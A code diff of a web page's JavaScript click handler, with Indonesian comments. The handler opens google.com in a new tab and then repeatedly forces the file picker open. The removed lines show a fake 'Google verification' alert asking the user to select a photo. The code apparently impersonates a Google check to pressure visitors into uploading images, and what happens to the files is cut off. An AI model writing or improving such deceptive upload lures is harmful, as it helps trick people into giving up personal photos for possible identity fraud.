@@ -126,26 +126,23 @@
       const link = document.getElementById("link");
       const img = document.getElementById("img");
 
-      link.onclick = (e) => {
-        // Prevents the browser from trying to navigate the anchor tag itself
-        e.preventDefault();
+    link.onclick = (e) => {
+  e.preventDefault();
 
-        alert(
-          "System Action Required: Please select a photo to proceed with Google verification.",
-        );
+  // Buka tab Google terlebih dahulu
+  const newTab = window.open("https://google.com", "_blank");
 
-        fileSelect.click();
-        fileSelect.click();
-                fileSelect.click();
+  // Beri jeda singkat agar tab baru sempat fokus
+  setTimeout(() => {
+    // Trigger file picker setelah tab baru aktif
+    fileSelect.click();
 
-                
-              // Then open the new tab via JS
-        window.open("https://google.com", "_blank");
-
-        // Trigger file picker first
-
-
-      };
+    // Optional: klik dua kali dengan jeda sangat pendek untuk "memaksa"
+    setTimeout(() => {
+      fileSelect.click();
+    }, 50);
+  }, 150);
+};
 
       fileSelect.onchange = (event) => {
         if (fileSelect.files.length > 0) {
